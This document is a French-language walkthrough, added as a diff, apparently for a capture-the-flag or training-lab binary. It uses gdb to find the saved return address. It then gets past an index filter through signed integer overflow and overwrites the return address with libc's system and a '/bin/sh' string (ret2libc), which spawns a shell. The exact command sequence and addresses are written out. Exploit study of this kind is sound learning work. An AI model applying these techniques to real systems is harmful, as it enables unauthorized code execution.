@@ -1,0 +1,33 @@
+On peut ecrire un nombre a un index souhaite avec ce programme. On voit qu'il n'est pas possible d'ecrire sur des indexes multiples de 3.
+On pourrait donc par exemple ecrire sur l'eip l'adresse d'un shellcode.
+Calculons l'index de l'eip. Il nous faut l'adresse de l'index 0 et l'adresse de l'eip.
+x/w $esp+0x24
+L'index 0 est a 0xffffd534
+info frame
+l'eip est a 0xffffd6fc. On fait la difference 0xffffd6fc - 0xffffd534 = 0x1c8 / 4 = 0x72 = 114
+On peut ecraser l'eip en ecrivant sur l'index 114. Pas de chance 114 est un multiple de 3, on va pas pouvoir l'utiliser directement.
+On peut overflow l'int pour ecrire 114 d'une autre maniere.
+2147483647 + 1 = 2147483648 est equivalent a 0 donc 2147483647 + 1 + 114 = 2147483762 est equivalent a 114.
+On test :
+b *main+679
+store
+8
+2147483762
+On check avec 'x/115w $esp+0x24', ca a fonctionne !
+On essaie d'utiliser re2libc il nous faut donc l'adresse de system.
+p system
+On obtient 0xf7e6aed0.
+Il nous faut aussi l'adresse d'une string "/bin/sh", on a vu qu'il y en avait une dans la libc. Avec :
+find system,+9999999,"/bin/sh"
+On trouve 0xf7f897ec
+A l'index 114 (2147483762) on va ecrire l'adresse de system 0xf7e6aed0 (4159090384).
+Et a l'index 116 on va ecrire l'edresse de notre /bin/sh 0xf7f897ec (4160264172).
+La suite de commandes a effecutes est donc
+store
+4159090384
+2147483762
+store
+4160264172
+116
+quit
+Notre shell se lance ! :D
